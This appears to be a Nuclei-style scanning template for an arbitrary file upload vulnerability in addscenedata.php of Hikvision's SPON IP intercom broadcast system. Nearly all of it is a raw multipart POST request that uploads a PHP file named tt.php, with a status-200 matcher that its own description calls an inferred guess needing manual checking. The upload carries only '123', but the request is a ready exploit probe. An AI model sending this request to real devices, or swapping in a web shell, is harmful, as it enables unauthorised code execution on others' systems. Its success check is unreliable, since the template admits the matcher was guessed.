id: poc-307c6de642f7b3339dba
info:
  name: 海康威视SPONIP网络对讲广播系统addscenedata存在任意文件上传漏洞
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: file-upload,2025
http:
- raw:
  - 'POST /php/addscenedata.php HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36

    Connection: close

    Content-Length: 218

    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary4LuoBRpTiVBo9cIQ

    Accept-Encoding: gzip


    ------WebKitFormBoundary4LuoBRpTiVBo9cIQ

    Content-Disposition: form-data; name="upload"; filename="tt.php"

    Content-Type: text/plain


    123

    ------WebKitFormBoundary4LuoBRpTiVBo9cIQ--'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
